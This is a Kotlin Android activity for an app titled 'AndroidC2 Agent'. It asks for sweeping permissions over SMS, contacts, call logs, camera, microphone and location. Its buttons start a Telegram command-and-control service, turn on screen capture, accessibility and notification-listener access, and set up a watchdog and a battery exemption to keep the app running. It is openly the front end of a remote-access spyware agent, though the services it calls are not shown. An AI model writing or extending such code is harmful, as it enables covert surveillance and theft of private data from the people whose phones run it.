package com.outcome.c2

import android.Manifest
import android.app.Activity
import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.view.View
import android.widget.Button
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView
import android.widget.Toast
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class MainActivity : Activity() {

    private lateinit var logView: TextView
    private lateinit var scroll: ScrollView
    private val handler = Handler(Looper.getMainLooper())
    private var autoRefresh = true

    private val PERMS = mutableListOf(
        Manifest.permission.INTERNET,
        Manifest.permission.ACCESS_NETWORK_STATE,
        Manifest.permission.ACCESS_WIFI_STATE,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.READ_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE,
    ).apply {
        if (Build.VERSION.SDK_INT >= 33) add(Manifest.permission.POST_NOTIFICATIONS)
    }.toTypedArray()

    private val REQ = 0xC2

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(32, 48, 32, 32)
        }

        root.addView(TextView(this).apply {
            text = "AndroidC2 Agent"
            textSize = 20f
        })

        root.addView(TextView(this).apply {
            text = "Mode: Telegram\nLong-running background service"
            textSize = 12f
            setPadding(0, 12, 0, 24)
        })

        fun btn(label: String, action: () -> Unit) {
            root.addView(Button(this).apply {
                text = label
                setOnClickListener { action() }
            })
        }

        btn("1. Grant permissions") {
            ActivityCompat.requestPermissions(this@MainActivity, PERMS, REQ)
        }
        btn("2. Start Telegram C2") {
            val i = Intent(this@MainActivity, TelegramC2Service::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                startForegroundService(i)
            else
                startService(i)
            log("main", "service start requested")
        }
        btn("3. Stop Telegram C2") {
            stopService(Intent(this@MainActivity, TelegramC2Service::class.java))
            log("main", "service stop requested")
        }
        btn("4. Enable screen capture") {
            startActivity(Intent(this@MainActivity, MediaProjectionSetupActivity::class.java))
        }
        btn("5. Enable accessibility") {
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
        }
        btn("6. Enable notification listener") {
            startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"))
        }
        btn("7. Schedule watchdog (15 min)") {
            WatchdogReceiver.schedule(this@MainActivity)
            log("main", "watchdog scheduled")
            Toast.makeText(this@MainActivity, "watchdog scheduled", Toast.LENGTH_SHORT).show()
        }
        btn("8. Request battery exemption") {
            requestBatteryExemption()
        }
        btn("9. Open battery settings") {
            openAppBatterySettings()
        }
        btn("10. Open app settings") {
            val i = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = Uri.fromParts("package", packageName, null)
            }
            startActivity(i)
        }

        root.addView(TextView(this).apply {
            text = "─ LOG ─"
            textSize = 11f
            setPadding(0, 24, 0, 8)
        })

        val btnRow = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
        }
        btnRow.addView(Button(this).apply {
            text = "Copy"
            setOnClickListener {
                val cm = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                cm.setPrimaryClip(ClipData.newPlainText("c2log", LogBus.read(this@MainActivity)))
                Toast.makeText(this@MainActivity, "copied", Toast.LENGTH_SHORT).show()
            }
        })
        btnRow.addView(Button(this).apply {
            text = "Clear"
            setOnClickListener {
                LogBus.clear(this@MainActivity)
                logView.text = "(cleared)"
            }
        })
        btnRow.addView(Button(this).apply {
            text = "Bottom"
            setOnClickListener {
                scroll.post { scroll.fullScroll(View.FOCUS_DOWN) }
            }
        })
        root.addView(btnRow)

        logView = TextView(this).apply {
            textSize = 10f
            setPadding(8, 8, 8, 8)
            setTextIsSelectable(true)
            typeface = android.graphics.Typeface.MONOSPACE
            text = LogBus.read(this@MainActivity)
        }
        scroll = ScrollView(this).apply {
            setBackgroundColor(0xFF000000.toInt())
            addView(logView)
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 0, 1f
            )
        }
        root.addView(scroll)

        setContentView(root)

        val missing = PERMS.any {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        if (missing) ActivityCompat.requestPermissions(this, PERMS, REQ)

        startLogRefresher()

        val prefs = getSharedPreferences("c2", MODE_PRIVATE)
        val projCode = prefs.getInt("proj_code", Int.MIN_VALUE)
        if (projCode != Int.MIN_VALUE) {
            Handler(Looper.getMainLooper()).postDelayed({
                startActivity(Intent(this, MediaProjectionSetupActivity::class.java))
            }, 1500)
        }

        WatchdogReceiver.schedule(this)
    }

    private fun requestBatteryExemption() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
                val pkg = packageName
                if (!pm.isIgnoringBatteryOptimizations(pkg)) {
                    val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                        data = Uri.parse("package:$pkg")
                    }
                    startActivity(intent)
                    log("main", "requested battery exemption")
                } else {
                    Toast.makeText(this, "already exempt", Toast.LENGTH_SHORT).show()
                }
            } catch (e: Exception) {
                log("main", "exemption failed: ${e.message}")
            }
        } else {
            Toast.makeText(this, "not needed on this Android version", Toast.LENGTH_SHORT).show()
        }
    }

    private fun openAppBatterySettings() {
        try {
            val i = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = Uri.fromParts("package", packageName, null)
            }
            startActivity(i)
            Toast.makeText(this, "Choose Battery → Unrestricted", Toast.LENGTH_LONG).show()
        } catch (e: Exception) {
            log("main", "battery settings failed: ${e.message}")
        }
    }

    private fun log(tag: String, msg: String) {
        LogBus.append(applicationContext, tag, msg)
        refreshLog()
    }

    private fun startLogRefresher() {
        handler.postDelayed(object : Runnable {
            override fun run() {
                if (autoRefresh) refreshLog()
                handler.postDelayed(this, 1000)
            }
        }, 1000)
    }

    private fun refreshLog() {
        val txt = LogBus.read(this)
        if (logView.text.toString() != txt) {
            logView.text = txt
            scroll.post { scroll.fullScroll(View.FOCUS_DOWN) }
        }
    }

    override fun onDestroy() {
        autoRefresh = false
        super.onDestroy()
    }
}
